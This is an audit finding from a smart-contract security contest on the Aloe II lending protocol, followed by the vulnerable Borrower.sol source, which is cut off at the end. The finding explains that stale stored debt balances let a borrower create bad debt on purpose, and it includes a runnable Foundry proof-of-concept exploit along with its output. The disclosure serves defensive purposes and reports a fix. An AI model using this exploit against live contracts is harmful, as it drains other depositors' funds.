{
  "Title": "H-3: `Borrower`'s `modify`, `liquidate` and `warn` functions use stored (outdated) account liabilities which makes it possible for the user to intentionally put him into bad debt in 1 transaction",
  "Content": "# Issue H-3: `Borrower`'s `modify`, `liquidate` and `warn` functions use stored (outdated) account liabilities which makes it possible for the user to intentionally put him into bad debt in 1 transaction \n\nSource: https://github.com/sherlock-audit/2023-10-aloe-judging/issues/41 \n\n## Found by \n0x007, 0xReiAyanami, Nyx, SilentDefendersOfDeFi, mstpr-brainbot, panprog, roguereddwarf\n\n`Borrower._getLiabilities()` function returns **stored** borrow balance:\n```solidity\nfunction _getLiabilities() private view returns (uint256 amount0, uint256 amount1) {\n    amount0 = LENDER0.borrowBalanceStored(address(this));\n    amount1 = LENDER1.borrowBalanceStored(address(this));\n}\n```\n\nStored balance is the balance **at the last interest settlement**, which is different (less) than current balance if there were no transactions accuring interest for this lender for some time. This means that this function returns outdated liabilities. For example:\nt=100: borrower1 borrows 10000 USDT\n... no transactions\nt=200: borrower1 borrowBalance = 10000.1 USDT (due to accured interest), but borrowBalanceStored = 10000 USDT (the amount at last interest accural).\n\n`_getLiabilities` function is used by `Borrower`'s `modify`, `liquidate` and `warn` functions, meaning that it works on outdated account borrow balances (liabilities), including health check. This leads to multiple problems, such as:\n1. `warn` and `liquidate` will revert trying to liquidate some accounts which just became unhealthy but were healthy at the last interest accural\n2. `liquidate` will not repay full account borrowBalances\n3. `modify` will allow account to be unhealthy after the actions it performs, if it's healthy using outdated stored borrow balances\n\nThe first 2 problems can be worked around by calling `Lender.accrueInterest` before `warn` or `liquidation`, which will settle interest rate fixing this problem. However, the 3rd issue is a lot more serious and can't be worked around as it allows malicious user to intentionally create bad debt in 1 transaction which will cause loss of funds for the other users.\n\n## Vulnerability Detail\n\nPossible scenario for the intentional creation of bad debt:\n1. Borrow max amount at max leverage + some safety margin so that position is healthy for the next few days, for example borrow 10000 DAI, add margin of 1051 DAI for safety (51 DAI required for MAX_LEVERAGE, 1000 DAI safety margin)\n2. Wait for a long period of market inactivity (such as 1 day).\n3. At this point `borrowBalance` is greater than `borrowBalanceStored` by a value higher than `MAX_LEVERAGE` (example: borrowBalance = 10630 DAI, borrowBalanceStored = 10000 DAI)\n3. Call `modify` and withdraw max possible amount (based on `borrowBalanceStored`), for example, withdraw 1000 DAI (remaining assets = 10051 DAI, which is healthy based on stored balance of 10000 DAI, but in fact this is already a bad debt, because borrow balance is 10630, which is more than remaining assets). This works, because liabilities used are outdated.\n\nAt this point the user is already in bad debt, but due to points 1-2, it's still not liquidatable. After calling `Lender.accrueInterest` the account can be liquidated. This bad debt caused is the funds lost by the other users.\n\nThis scenario is not profitable to the malicious user, but can be modified to make it profitable: the user can deposit large amount to lender before these steps, meaning the inflated interest rate will be accured by user's deposit to lender, but it will not be paid by the user due to bad debt (user will deposit 1051 DAI, withdraw 1000 DAI, and gain some share of accured 630 DAI, for example if he doubles the lender's TVL, he will gain 315 DAI - protocol fees).\n\n## Impact\n\nMalicious user can create bad debt to his account in 1 transaction. Bad debt is the amount not withdrawable from the lender by users who deposited. Since users will know that the lender doesn't have enough assets to pay out to all users, it can cause bank run since first users to withdraw from lender will be able to do so, while those who are the last to withdraw will lose their funds.\n\n## Proof of concept\n\nThe scenario above is demonstrated in the test, create test/Exploit.t.sol:\n```ts\n// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.17;\n\nimport \"forge-std/Test.sol\";\n\nimport {MAX_RATE, DEFAULT_ANTE, DEFAULT_N_SIGMA, LIQUIDATION_INCENTIVE} from \"src/libraries/constants/Constants.sol\";\nimport {Q96} from \"src/libraries/constants/Q.sol\";\nimport {zip} from \"src/libraries/Positions.sol\";\n\nimport \"src/Borrower.sol\";\nimport \"src/Factory.sol\";\nimport \"src/Lender.sol\";\nimport \"src/RateModel.sol\";\n\nimport {FatFactory, VolatilityOracleMock} from \"./Utils.sol\";\n\ncontract RateModelMax is IRateModel {\n    uint256 private constant _A = 6.1010463348e20;\n\n    uint256 private constant _B = _A / 1e18;\n\n    /// @inheritdoc IRateModel\n    function getYieldPerSecond(uint256 utilization, address) external pure returns (uint256) {\n        unchecked {\n            return (utilization < 0.99e18) ? _A / (1e18 - utilization) - _B : MAX_RATE;\n        }\n    }\n}\n\ncontract ExploitTest is Test, IManager, ILiquidator {\n    IUniswapV3Pool constant pool = IUniswapV3Pool(0xC2e9F25Be6257c210d7Adf0D4Cd6E3E881ba25f8);\n    ERC20 constant asset0 = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n    ERC20 constant asset1 = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n\n    Lender immutable lender0;\n    Lender immutable lender1;\n    Borrower immutable account;\n\n    constructor() {\n        vm.createSelectFork(vm.rpcUrl(\"mainnet\"));\n        vm.rollFork(15_348_451);\n\n        Factory factory = new FatFactory(\n            address(0),\n            address(0),\n            VolatilityOracle(address(new VolatilityOracleMock())),\n            new RateModelMax()\n        );\n\n        factory.createMarket(pool);\n        (lender0, lender1, ) = factory.getMarket(pool);\n        account = factory.createBorrower(pool, address(this), bytes12(0));\n    }\n\n    function setUp() public {\n        // deal to lender and deposit (so that there are assets to borrow)\n        deal(address(asset0), address(lender0), 10000e18); // DAI\n        deal(address(asset1), address(lender1), 10000e18); // WETH\n        lender0.deposit(10000e18, address(12345));\n        lender1.deposit(10000e18, address(12345));\n\n        deal(address(account), DEFAULT_ANTE + 1);\n    }\n\n    function test_selfLiquidation() public {\n\n        // malicious user borrows at max leverage + some safety margin\n        uint256 margin0 = 51e18 + 1000e18;\n        uint256 borrows0 = 10000e18;\n\n        deal(address(asset0), address(account), margin0);\n\n        bytes memory data = abi.encode(Action.BORROW, borrows0, 0);\n        account.modify(this, data, (1 << 32));\n\n        assertEq(lender0.borrowBalance(address(account)), borrows0);\n        assertEq(asset0.balanceOf(address(account)), borrows0 + margin0);\n\n        // skip 1 day (without transactions)\n        skip(86400);\n\n        emit log_named_uint(\"User borrow:\", lender0.borrowBalance(address(account)));\n        emit log_named_uint(\"User stored borrow:\", lender0.borrowBalanceStored(address(account)));\n\n        // withdraw all the \"extra\" balance putting account into bad debt\n        bytes memory data2 = abi.encode(Action.WITHDRAW, 1000e18, 0);\n        account.modify(this, data2, (1 << 32));\n\n        // account is still not liquidatable (because liquidation also uses stored liabilities)\n        vm.expectRevert();\n        account.warn((1 << 32));\n\n        // make account liquidatable by settling accumulated interest\n        lender0.accrueInterest();\n\n        // warn account\n        account.warn((1 << 32));\n\n        // skip warning time\n        skip(LIQUIDATION_GRACE_PERIOD);\n        lender0.accrueInterest();\n\n        // liquidation reverts because it requires asset the account doesn't have to swap\n        vm.expectRevert();\n        account.liquidate(this, bytes(\"\"), 1, (1 << 32));\n\n        emit log_named_uint(\"Before liquidation User borrow:\", lender0.borrowBalance(address(account)));\n        emit log_named_uint(\"Before liquidation User stored borrow:\", lender0.borrowBalanceStored(address(account)));\n        emit log_named_uint(\"Before liquidation User assets:\", asset0.balanceOf(address(account)));\n\n        // liquidate with max strain to avoid revert when trying to swap assets account doesn't have\n        account.liquidate(this, bytes(\"\"), type(uint256).max, (1 << 32));\n\n        emit log_named_uint(\"Liquidated User borrow:\", lender0.borrowBalance(address(account)));\n        emit log_named_uint(\"Liquidated User assets:\", asset0.balanceOf(address(account)));\n    }\n\n    enum Action {\n        WITHDRAW,\n        BORROW,\n        UNI_DEPOSIT\n    }\n\n    // IManager\n    function callback(bytes calldata data, address, uint208) external returns (uint208 positions) {\n        require(msg.sender == address(account));\n\n        (Action action, uint256 amount0, uint256 amount1) = abi.decode(data, (Action, uint256, uint256));\n\n        if (action == Action.WITHDRAW) {\n            account.transfer(amount0, amount1, address(this));\n        } else if (action == Action.BORROW) {\n            account.borrow(amount0, amount1, msg.sender);\n        } else if (action == Action.UNI_DEPOSIT) {\n            account.uniswapDeposit(-75600, -75540, 200000000000000000);\n            positions = zip([-75600, -75540, 0, 0, 0, 0]);\n        }\n    }\n\n    // ILiquidator\n    receive() external payable {}\n\n    function swap1For0(bytes calldata data, uint256 actual, uint256 expected0) external {\n        /*\n        uint256 expected = abi.decode(data, (uint256));\n        if (expected == type(uint256).max) {\n            Borrower(payable(msg.sender)).liquidate(this, data, 1, (1 << 32));\n        }\n        assertEq(actual, expected);\n        */\n        pool.swap(msg.sender, false, -int256(expected0), TickMath.MAX_SQRT_RATIO - 1, bytes(\"\"));\n    }\n\n    function swap0For1(bytes calldata data, uint256 actual, uint256 expected1) external {\n        /*\n        uint256 expected = abi.decode(data, (uint256));\n        if (expected == type(uint256).max) {\n            Borrower(payable(msg.sender)).liquidate(this, data, 1, (1 << 32));\n        }\n        assertEq(actual, expected);\n        */\n        pool.swap(msg.sender, true, -int256(expected1), TickMath.MIN_SQRT_RATIO + 1, bytes(\"\"));\n    }\n\n    // IUniswapV3SwapCallback\n    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {\n        if (amount0Delta > 0) asset0.transfer(msg.sender, uint256(amount0Delta));\n        if (amount1Delta > 0) asset1.transfer(msg.sender, uint256(amount1Delta));\n    }\n\n    // Factory mock\n    function getParameters(IUniswapV3Pool) external pure returns (uint248 ante, uint8 nSigma) {\n        ante = DEFAULT_ANTE;\n        nSigma = DEFAULT_N_SIGMA;\n    }\n\n    // (helpers)\n    function _setInterest(Lender lender, uint256 amount) private {\n        bytes32 ID = bytes32(uint256(1));\n        uint256 slot1 = uint256(vm.load(address(lender), ID));\n\n        uint256 borrowBase = slot1 % (1 << 184);\n        uint256 borrowIndex = slot1 >> 184;\n\n        uint256 newSlot1 = borrowBase + (((borrowIndex * amount) / 10_000) << 184);\n        vm.store(address(lender), ID, bytes32(newSlot1));\n    }\n}\n```\n\nExecution console log:\n```solidity\n  User borrow:: 10629296791890000000000\n  User stored borrow:: 10000000000000000000000\n  Before liquidation User borrow:: 10630197795010000000000\n  Before liquidation User stored borrow:: 10630197795010000000000\n  Before liquidation User assets:: 10051000000000000000000\n  Liquidated User borrow:: 579197795010000000001\n  Liquidated User assets:: 0\n```\n\nAs can be seen, in the end user debt is 579 DAI with 0 assets.\n\n## Code Snippet\n\n`Borrower._getLiabilities()` returns stored balances:\nhttps://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L527-L530\n\n`borrowBalanceStored` uses `borrowIndex` (which is index at last accural):\nhttps://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Ledger.sol#L226-L232\n\nFor comparision, `borrowBalance` uses `_previewInterest` to get current borrow balance:\nhttps://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Ledger.sol#L216-L223\n\n`Borrower.warn` uses `_getLiabilities`:\nhttps://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L166\n\n`liquidate` uses `_getLiabilities`:\nhttps://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L211\n\n`modify` also uses `_getLiabilities`:\nhttps://github.com/sherlock-audit/2023-10-aloe/blob/main/aloe-ii/core/src/Borrower.sol#L314\n\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider using `borrowBalance` instead of `borrowBalanceStored` in `_getLiabilities()`.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**MohammedRizwan** commented:\n>  valid issue\n\n\n\n**haydenshively**\n\nFixed in https://github.com/aloelabs/aloe-ii/pull/205\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/120",
  "Code": [
    {
      "filename": "aloe-ii/core/src/Borrower.sol",
      "content": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.17;\n\nimport {ImmutableArgs} from \"clones-with-immutable-args/ImmutableArgs.sol\";\nimport {Math} from \"openzeppelin-contracts/contracts/utils/math/Math.sol\";\nimport {ERC20, SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\nimport {IUniswapV3MintCallback} from \"v3-core/contracts/interfaces/callback/IUniswapV3MintCallback.sol\";\nimport {IUniswapV3Pool} from \"v3-core/contracts/interfaces/IUniswapV3Pool.sol\";\n\nimport {LIQUIDATION_GRACE_PERIOD} from \"./libraries/constants/Constants.sol\";\nimport {Q128} from \"./libraries/constants/Q.sol\";\nimport {BalanceSheet, Assets, Prices} from \"./libraries/BalanceSheet.sol\";\nimport {LiquidityAmounts} from \"./libraries/LiquidityAmounts.sol\";\nimport {square, mulDiv128} from \"./libraries/MulDiv.sol\";\nimport {extract} from \"./libraries/Positions.sol\";\nimport {TickMath} from \"./libraries/TickMath.sol\";\n\nimport {Factory} from \"./Factory.sol\";\nimport {Lender} from \"./Lender.sol\";\nimport {VolatilityOracle} from \"./VolatilityOracle.sol\";\n\ninterface ILiquidator {\n    receive() external payable;\n\n    function swap1For0(bytes calldata data, uint256 received1, uint256 expected0) external;\n\n    function swap0For1(bytes calldata data, uint256 received0, uint256 expected1) external;\n}\n\ninterface IManager {\n    /**\n     * @notice Gives the `IManager` full control of the `Borrower`. Called within `Borrower.modify`.\n     * @dev In most cases, you'll want to verify that `msg.sender` is, in fact, a `Borrower` using\n     * `factory.isBorrower(msg.sender)`.\n     * @param data Encoded parameters that were passed to `Borrower.modify`\n     * @param owner The owner of the `Borrower`\n     * @param positions The `Borrower`'s current Uniswap positions. You can convert them to an array using\n     * `Positions.extract`\n     * @return Updated positions, encoded using `Positions.zip`. Return 0 if you don't wish to make any changes.\n     */\n    function callback(bytes calldata data, address owner, uint208 positions) external returns (uint208);\n}\n\n/// @title Borrower\n/// @author Aloe Labs, Inc.\n/// @dev \"Test everything; hold fast what is good.\" - 1 Thessalonians 5:21\ncontract Borrower is IUniswapV3MintCallback {\n    using SafeTransferLib for ERC20;\n\n    /**\n     * @notice Most liquidations involve swapping one asset for another. To incentivize such swaps (even in\n     * volatile markets) liquidators are rewarded with a 5% bonus. To avoid paying that bonus to liquidators,\n     * the account owner can listen for this event. Once it's emitted, they have 2 minutes to bring the\n     * account back to health. If they fail, the liquidation will proceed.\n     * @dev Fortuitous price movements and/or direct `Lender.repay` can bring the account back to health and\n     * nullify the immediate liquidation threat, but they will not clear the warning. This means that next\n     * time the account is unhealthy, liquidators might skip `warn` and `liquidate` right away. To clear the\n     * warning and return to a \"clean\" state, make sure to call `modify` -- even if the callback is a no-op.\n     * @dev The deadline for regaining health (avoiding liquidation) is given by `slot0.unleashLiquidationTime`.\n     * If this value is 0, the account is in the aforementioned \"clean\" state.\n     */\n    event Warn();\n\n    /**\n     * @notice Emitted when the account gets `liquidate`d\n     * @param repay0 The amount of `TOKEN0` that was repaid\n     * @param repay1 The amount of `TOKEN1` that was repaid\n     * @param incentive1 The value of the swap bonus given to the liquidator, expressed in terms of `TOKEN1`\n     * @param priceX128 The price at which the liquidation took place\n     */\n    event Liquidate(uint256 repay0, uint256 repay1, uint256 incentive1, uint256 priceX128);\n\n    enum State {\n        Ready,\n        Locked,\n        InModifyCallback\n    }\n\n    uint256 private constant SLOT0_MASK_POSITIONS = 0x000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffff;\n    uint256 private constant SLOT0_MASK_UNLEASH   = 0x00ffffffffff0000000000000000000000000000000000000000000000000000; // prettier-ignore\n    uint256 private constant SLOT0_MASK_STATE     = 0x7f00000000000000000000000000000000000000000000000000000000000000; // prettier-ignore\n    uint256 private constant SLOT0_DIRT           = 0x8000000000000000000000000000000000000000000000000000000000000000; // prettier-ignore\n\n    /// @notice The factory that created this contract\n    Factory public immutable FACTORY;\n\n    /// @notice The oracle to use for prices and implied volatility\n    VolatilityOracle public immutable ORACLE;\n\n    /// @notice The Uniswap pair in which this `Borrower` can manage positions\n    IUniswapV3Pool public immutable UNISWAP_POOL;\n\n    /// @notice The first token of the Uniswap pair\n    ERC20 public immutable TOKEN0;\n\n    /// @notice The second token of the Uniswap pair\n    ERC20 public immutable TOKEN1;\n\n    /// @notice The lender of `TOKEN0`\n    Lender public immutable LENDER0;\n\n    /// @notice The lender of `TOKEN1`\n    Lender public immutable LENDER1;\n\n    /**\n     * @notice The `Borrower`'s only mutable storage. Lowest 144 bits store the lower/upper bounds of up to 3 Uniswap\n     * positions, encoded by `Positions.zip`. Next 64 bits are unused within the `Borrower` and available to users as\n     * \"free\" storage － no additional sstore's. These 208 bits (144 + 64) are passed to `IManager.callback`, and get\n     * updated when the callback returns a non-zero value. The next 40 bits are either 0 or `unleashLiquidationTime`,\n     * as explained in the `Warn` event docs. The highest 8 bits represent the current `State` enum, plus 128. We add\n     * 128 (i.e. set the highest bit to 1) so that the slot is always non-zero, even in the absence of Uniswap\n     * positions － this saves gas.\n     */\n    uint256 public slot0;\n\n    modifier onlyInModifyCallback() {\n        require(slot0 & SLOT0_MASK_STATE == uint256(State.InModifyCallback) << 248);\n        _;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                              CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    constructor(VolatilityOracle oracle, IUniswapV3Pool pool, Lender lender0, Lender lender1) {\n        FACTORY = Factory(msg.sender);\n        ORACLE = oracle;\n        UNISWAP_POOL = pool;\n        LENDER0 = lender0;\n        LENDER1 = lender1;\n\n        TOKEN0 = lender0.asset();\n        TOKEN1 = lender1.asset();\n\n        assert(pool.token0() == address(TOKEN0) && pool.token1() == address(TOKEN1));\n    }\n\n    receive() external payable {}\n\n    function owner() public pure returns (address) {\n        return ImmutableArgs.addr();\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                           MAIN ENTRY POINTS\n    //////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Warns the borrower that they're about to be liquidated. NOTE: Liquidators are only\n     * forced to call this in cases where the 5% swap bonus is up for grabs.\n     * @param oracleSeed The indices of `UNISWAP_POOL.observations` where we start our search for\n     * the 30-minute-old (lowest 16 bits) and 60-minute-old (next 16 bits) observations when getting\n     * TWAPs. If any of the highest 8 bits are set, we fallback to onchain binary search.\n     */\n    function warn(uint40 oracleSeed) external {\n        uint256 slot0_ = slot0;\n        // Essentially `slot0.state == State.Ready && slot0.unleashLiquidationTime == 0`\n        require(slot0_ & (SLOT0_MASK_STATE | SLOT0_MASK_UNLEASH) == 0);\n\n        {\n            // Fetch prices from oracle\n            (Prices memory prices, ) = getPrices(oracleSeed);\n            // Tally assets without actually withdrawing Uniswap positions\n            Assets memory assets = _getAssets(slot0_, prices, false);\n            // Fetch liabilities from lenders\n            (uint256 liabilities0, uint256 liabilities1) = _getLiabilities();\n            // Ensure only unhealthy accounts get warned\n            require(!BalanceSheet.isHealthy(prices, assets, liabilities0, liabilities1), \"Aloe: healthy\");\n        }\n\n        slot0 = slot0_ | ((block.timestamp + LIQUIDATION_GRACE_PERIOD) << 208);\n        emit Warn();\n    }\n\n    /**\n     * @notice Liquidates the borrower, using all available assets to pay down liabilities. If\n     * some or all of the payment cannot be made in-kind, `callee` is expected to swap one asset\n     * for the other at a venue of their choosing. NOTE: Branches involving callbacks will fail\n     * until the borrower has been `warn`ed and the grace period has expired.\n     * @dev As a baseline, `callee` receives `address(this).balance / strain` ETH. This amount is\n     * intended to cover transaction fees. If the liquidation involves a swap callback, `callee`\n     * receives a 5% bonus denominated in the surplus token. In other words, if the two numeric\n     * callback arguments were denominated in the same asset, the first argument would be 5% larger.\n     * @param callee A smart contract capable of swapping `TOKEN0` for `TOKEN1` and vice versa\n     * @param data Encoded parameters that get forwarded to `callee` callbacks\n     * @param strain Almost always set to `1` to pay off all debt and receive maximum reward. If\n     * liquidity is thin and swap price impact would be too large, you can use higher values to\n     * reduce swap size and make it easier for `callee` to do its job. `2` would be half swap size,\n     * `3` one third, and so on.\n     * @param oracleSeed The indices of `UNISWAP_POOL.observations` where we start our search for\n     * the 30-minute-old (lowest 16 bits) and 60-minute-old (next 16 bits) observations when getting\n     * TWAPs. If any of the highest 8 bits are set, we fallback to onchain binary search.\n     */\n    function liquidate(ILiquidator callee, bytes calldata data, uint256 strain, uint40 oracleSeed) external {\n        uint256 slot0_ = slot0;\n        // Essentially `slot0.state == State.Ready`\n        require(slot0_ & SLOT0_MASK_STATE == 0);\n        slot0 = slot0_ | (uint256(State.Locked) << 248);\n\n        uint256 priceX128;\n        uint256 liabilities0;\n        uint256 liabilities1;\n        uint256 incentive1;\n        {\n            // Fetch prices from oracle\n            (Prices memory prices, ) = getPrices(oracleSeed);\n            priceX128 = square(prices.c);\n            // Withdraw Uniswap positions while tallying assets\n            Assets memory assets = _getAssets(slot0_, prices, true);\n            // Fetch liabilities from lenders\n            (liabilities0, liabilities1) = _getLiabilities();\n            // Calculate liquidation incentive\n            incentive1 = BalanceSheet.computeLiquidationIncentive(\n                assets.fixed0 + assets.fluid0C, // total assets0 at `prices.c` (the TWAP)\n                assets.fixed1 + assets.fluid1C, // total assets1 at `prices.c` (the TWAP)\n                liabilities0,\n                liabilities1,\n                priceX128\n            );\n            // Ensure only unhealthy accounts can be liquidated\n            require(!BalanceSheet.isHealthy(prices, assets, liabilities0, liabilities1), \"Aloe: healthy\");\n        }\n\n        // NOTE: The health check values assets at the TWAP and is difficult to manipulate. However,\n        // the instantaneous price does impact what tokens we receive when burning Uniswap positions.\n        // As such, additional calls to `TOKEN0.balanceOf` and `TOKEN1.balanceOf` are required for\n        // precise inventory, and we take care not to increase `incentive1`.\n\n        unchecked {\n            // Figure out what portion of liabilities can be repaid using existing assets\n            uint256 repayable0 = Math.min(liabilities0, TOKEN0.balanceOf(address(this)));\n            uint256 repayable1 = Math.min(liabilities1, TOKEN1.balanceOf(address(this)));\n\n            // See what remains (similar to \"shortfall\" in BalanceSheet)\n            liabilities0 -= repayable0;\n            liabilities1 -= repayable1;\n\n            // Decide whether to swap or not\n            bool shouldSwap;\n            assembly (\"memory-safe\") {\n                // If both are zero or neither is zero, there's nothing more to do\n                shouldSwap := xor(gt(liabilities0, 0), gt(liabilities1, 0))\n                // Divide by `strain` and check again. This second check can generate false positives in cases\n                // where one division (not both) floors to 0, which is why we `and()` with the check above.\n                liabilities0 := div(liabilities0, strain)\n                liabilities1 := div(liabilities1, strain)\n                shouldSwap := and(shouldSwap, xor(gt(liabilities0, 0), gt(liabilities1, 0)))\n                // If not swapping, set `incentive1 = 0`\n                incentive1 := mul(shouldSwap, incentive1)\n            }\n\n            if (shouldSwap) {\n                uint256 unleashTime = (slot0_ & SLOT0_MASK_UNLEASH) >> 208;\n                require(0 < unleashTime && unleashTime < block.timestamp, \"Aloe: grace\");\n\n                incentive1 /= strain;\n                if (liabilities0 > 0) {\n                    // NOTE: This value is not constrained to `TOKEN1.balanceOf(address(this))`, so liquidators\n                    // are responsible for setting `strain` such that the transfer doesn't revert. This shouldn't\n                    // be an issue unless the borrower has already started accruing bad debt.\n                    uint256 available1 = mulDiv128(liabilities0, priceX128) + incentive1;\n\n                    TOKEN1.safeTransfer(address(callee), available1);\n                    callee.swap1For0(data, available1, liabilities0);\n\n                    repayable0 += liabilities0;\n                } else {\n                    // NOTE: This value is not constrained to `TOKEN0.balanceOf(address(this))`, so liquidators\n                    // are responsible for setting `strain` such that the transfer doesn't revert. This shouldn't\n                    // be an issue unless the borrower has already started accruing bad debt.\n                    uint256 available0 = Math.mulDiv(liabilities1 + incentive1, Q128, priceX128);\n\n                    TOKEN0.safeTransfer(address(callee), available0);\n                    callee.swap0For1(data, available0, liabilities1);\n\n                    repayable1 += liabilities1;\n                }\n            }\n\n            _repay(repayable0, repayable1);\n            slot0 = (slot0_ & SLOT0_MASK_POSITIONS) | SLOT0_DIRT;\n\n            payable(callee).transfer(address(this).balance / strain);\n            emit Liquidate(repayable0, repayable1, incentive1, priceX128);\n        }\n    }\n\n    /**\n     * @notice Allows the owner to manage their account by handing control to some `callee`. Inside the\n     * callback `callee` has access to all sub-commands (`uniswapDeposit`, `uniswapWithdraw`, `transfer`,\n     * `borrow`, `repay`, and `withdrawAnte`). Whatever `callee` does, the account MUST be healthy\n     * after the callback.\n     * @param callee The smart contract that will get temporary control of this account\n     * @param data Encoded parameters that get forwarded to `callee`\n     * @param oracleSeed The indices of `UNISWAP_POOL.observations` where we start our search for\n     * the 30-minute-old (lowest 16 bits) and 60-minute-old (next 16 bits) observations when getting\n     * TWAPs. If any of the highest 8 bits are set, we fallback to onchain binary search.\n     */\n    function modify(IManager callee, bytes calldata data, uint40 oracleSeed) external payable {\n        uint256 slot0_ = slot0;\n        // Essentially `slot0.state == State.Ready && msg.sender == owner()`\n        require(slot0_ & SLOT0_MASK_STATE == 0 && msg.sender == owner(), \"Aloe: only owner\");\n\n        slot0 = slot0_ | (uint256(State.InModifyCallback) << 248);\n        {\n            uint208 positions = callee.callback(data, msg.sender, uint208(slot0_));\n            assembly (\"memory-safe\") {\n                // Equivalent to `if (positions > 0) slot0_ = positions`\n                slot0_ := or(positions, mul(slot0_, iszero(positions)))\n            }\n        }\n        slot0 = (slot0_ & SLOT0_MASK_POSITIONS) | SLOT0_DIRT;\n\n        (uint256 liabilities0, uint256 liabilities1) = _getLiabilities();\n        if (liabilities0 > 0 || liabilities1 > 0) {\n            (uint208 ante, uint8 nSigma, uint8 mtd, uint32 pausedUntilTime) = FACTORY.getParameters(UNISWAP_POOL);\n            (Prices memory prices, bool seemsLegit) = _getPrices(oracleSeed, nSigma, mtd);\n\n            require(\n                seemsLegit && (block.timestamp > pausedUntilTime) && (address(this).balance >= ante),\n                \"Aloe: missing ante / sus price\"\n            );\n\n            Assets memory assets = _getAssets(slot0_, prices, false);\n            require(BalanceSheet.isHealthy(prices, assets, liabilities0, liabilities1), \"Aloe: unhealthy\");\n        }\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                              SUB-COMMANDS\n    //////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Callback for Uniswap V3 pool; necessary for `uniswapDeposit` to work\n     * @param amount0 The amount of `TOKEN0` owed to the `UNISWAP_POOL`\n     * @param amount1 The amount of `TOKEN1` owed to the `UNISWAP_POOL`\n     */\n    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes calldata) external {\n        require(msg.sender == address(UNISWAP_POOL));\n\n        if (amount0 > 0) TOKEN0.safeTransfer(msg.sender, amount0);\n        if (amount1 > 0) TOKEN1.safeTransfer(msg.sender, amount1);\n    }\n\n    /**\n     * @notice Allows the `owner()` to add liquidity to a Uniswap position (or create a new one). Only works\n     * within the `modify` callback.\n     * @dev The `LiquidityAmounts` library can help convert underlying amounts to units of `liquidity`.\n     * NOTE: Depending on your use-case, it may be more gas-efficient to call `UNISWAP_POOL.mint` in your\n     * own contract, instead of doing `uniswapDeposit` inside of `modify`'s callback. As long as you set\n     * this `Borrower` as the recipient in `UNISWAP_POOL.mint`, the result is the same.\n     * @param lower The tick at the position's lower bound\n     * @param upper The tick at the position's upper bound\n     * @param liquidity The amount of liquidity to add, in Uniswap's internal units\n     * @return amount0 The precise amount of `TOKEN0` that went into the Uniswap position\n     * @return amount1 The precise amount of `TOKEN1` that went into the Uniswap position\n     */\n    function uniswapDeposit(\n        int24 lower,\n        int24 upper,\n        uint128 liquidity\n    ) external onlyInModifyCallback returns (uint256 amount0, uint256 amount1) {\n        (amount0, amount1) = UNISWAP_POOL.mint(address(this), lower, upper, liquidity, \"\");\n    }\n\n    /**\n     * @notice Allows the `owner()` to withdraw liquidity from one of their Uniswap positions. Only works within\n     * the `modify` callback.\n     * @dev The `LiquidityAmounts` library can help convert underlying amounts to units of `liquidity`\n     * @param lower The tick at the position's lower bound\n     * @param upper The tick at the position's upper bound\n     * @param liquidity The amount of liquidity to remove, in Uniswap's internal units. Pass 0 to collect\n     * fees without burning any liquidity.\n     * @param recipient Receives the tokens from Uniswap. Usually the address of this `Borrower` account.\n     * @return burned0 The amount of `TOKEN0` that was removed from the Uniswap position\n     * @return burned1 The amount of `TOKEN1` that was removed from the Uniswap position\n     * @return collected0 Equal to `burned0` plus any earned `TOKEN0` fees that hadn't yet been claimed\n     * @return collected1 Equal to `burned1` plus any earned `TOKEN1` fees that hadn't yet been claimed\n     */\n    function uniswapWithdraw(\n        int24 lower,\n        int24 upper,\n        uint128 liquidity,\n        address recipient\n    ) external onlyInModifyCallback returns (uint256 burned0, uint256 burned1, uint256 collected0, uint256 collected1) {\n        (burned0, burned1, collected0, collected1) = _uniswapWithdraw(lower, upper, liquidity, recipient);\n    }\n\n    /**\n     * @notice The most flexible sub-command. Allows the `owner()` to transfer amounts of `TOKEN0` and `TOKEN1`\n     * to any `recipient` they want. Only works within the `modify` callback.\n     * @param amount0 The amount of `TOKEN0` to transfer\n     * @param amount1 The amount of `TOKEN1` to transfer\n     * @param recipient Receives the transferred tokens\n     */\n    function transfer(uint256 amount0, uint256 amount1, address recipient) external onlyInModifyCallback {\n        if (amount0 > 0) TOKEN0.safeTransfer(recipient, amount0);\n        if (amount1 > 0) TOKEN1.safeTransfer(recipient, amount1);\n    }\n\n    /**\n     * @notice Allows the `owner()` to borrow funds from `LENDER0` and `LENDER1`. Only works within the `modify`\n     * callback.\n     * @dev If `amount0 > 0` and interest hasn't yet accrued in this block for `LENDER0`, it will accrue\n     * prior to processing your new borrow. Same goes for `amount1 > 0` and `LENDER1`.\n     * @param amount0 The amount of `TOKEN0` to borrow\n     * @param amount1 The amount of `TOKEN1` to borrow\n     * @param recipient Receives the borrowed tokens. Usually the address of this `Borrower` account.\n     */\n    function borrow(uint256 amount0, uint256 amount1, address recipient) external onlyInModifyCallback {\n        if (amount0 > 0) LENDER0.borrow(amount0, recipient);\n        if (amount1 > 0) LENDER1.borrow(amount1, recipient);\n    }\n\n    /**\n     * @notice Allows the `owner()` to repay debts to `LENDER0` and `LENDER1`. Only works within the `modify`\n     * callback.\n     * 